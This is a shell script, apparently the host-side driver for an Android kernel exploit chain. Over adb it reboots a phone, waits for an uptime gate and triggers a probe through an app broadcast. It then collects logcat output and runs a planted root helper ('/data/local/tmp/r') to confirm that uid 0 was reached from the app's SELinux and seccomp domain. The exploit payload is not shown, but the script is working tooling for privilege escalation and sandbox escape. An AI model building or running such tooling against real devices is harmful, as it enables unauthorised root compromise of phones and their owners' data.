#!/bin/sh
# One-key host driver for the *app domain* run.
#
#   sh src/probe/run_apk.sh boot     # reboot, wait for the uptime gate, then fire
#   sh src/probe/run_apk.sh fire     # device is already settled: just fire
#
# The app runs the same probe from a zygote child, i.e. under the app's
# SELinux domain and inside its seccomp filter.  The only difference from the
# shell-domain run is the commit vehicle: PROBE_SLOT=58 (vhangup) instead of a
# number in the arm64 ni hole, because C-19 showed the app whitelist and that
# hole do not intersect.
#
# Everything the app writes is readable from adb:
#   /sdcard/Android/data/com.hlk.rootguard/files/probe.out   (fsynced mirror)
#   /sdcard/Android/data/com.hlk.rootguard/files/probe.log   (stdout capture)
set -u
cd "$(dirname "$0")/../.." || exit 1

MODE="${1:-fire}"
ADB="adb"
: "${ANDROID_SERIAL:?set ANDROID_SERIAL to the phone's serial}"
export ANDROID_SERIAL

PKG=com.hlk.rootguard
APK=bin/hlk-root-guard.apk
EXT=/sdcard/Android/data/$PKG/files
MIRROR=$EXT/probe.out
LOG=${LOG:-/tmp/hlk_apk_run.host.log}
UPGATE=1500
: > "$LOG"

say() { echo "$@" | tee -a "$LOG"; }
sh_dev() { $ADB shell "$@" 2>&1 | tr -d '\r'; }

wait_device() {
	for i in $(seq 1 120); do
		[ "$($ADB get-state 2>/dev/null)" = device ] && return 0
		sleep 2
	done
	return 1
}

gate() {
	while :; do
		up=$(sh_dev "cut -d. -f1 /proc/uptime")
		case "$up" in ''|*[!0-9]*) sleep 3; continue ;; esac
		if [ "$up" -ge "$UPGATE" ]; then
			say "== uptime=$up s, gate clear =="
			return 0
		fi
		say "== uptime=${up}s, still gating (need ${UPGATE}s) =="
		sleep 30
	done
}

if [ "$MODE" = boot ]; then
	say "== rebooting to clear any hijacked page tables =="
	$ADB reboot >/dev/null 2>&1
	sleep 5
	wait_device || { echo "!! device did not come back" >&2; exit 1; }
	say "== device is back =="
fi

wait_device || { echo "!! no device" >&2; exit 1; }
gate

say "== clearing the previous run's log =="
sh_dev "rm -f $MIRROR $EXT/probe.log $EXT/rootup" >/dev/null

say "== firing through the app (delay 0, reboot brake untouched) =="
sh_dev "am broadcast -n $PKG/.CtlReceiver -a $PKG.CTL --es cmd run --ei delay 0" \
	| tee -a "$LOG"

# The chain needs ~10 s once the probe's own uptime gate clears.  Android 10
# scoped storage hides the app's external files dir from adb shell, so the
# mirror is logcat: GuardService.note() logs every probe line as HlkGuard.
prev=""
for i in $(seq 1 1100); do
	sleep 2
	cur=$($ADB logcat -d 2>/dev/null | grep -E "HlkGuard" | tail -n 60)
	[ -z "$cur" ] && continue
	case "$cur" in
	*"PHASE_I OK"*|*"PHASE_I FAIL"*|*"keepalive"*) prev="$cur"; break ;;
	esac
	prev="$cur"
done

say "== probe log (logcat HlkGuard) tail =="
echo "$prev" | tee -a "$LOG"

say "== device view =="
sh_dev "ps -A -o PID,PPID,USER,NAME | grep -E '[j]it_write|[x]probe|[r]ootsrv'" | tee -a "$LOG"
sh_dev "ls -l $EXT/ 2>/dev/null" | tee -a "$LOG"
# app-private /data/data/<pkg>/files/chan is 0700 and adb shell cannot enter
# it.  rootd.sh gets TWO inboxes (/data/local/tmp and the app dir), and writes
# a marker into both, so the public one is what adb can actually read.
sh_dev "cat /data/local/tmp/rootup 2>/dev/null" | tee -a "$LOG"

say "== root channel end-to-end (uid 0 reached from the app domain) =="
sh_dev "/data/local/tmp/r 'id; echo APK-ROOT-OK'" | tee -a "$LOG"
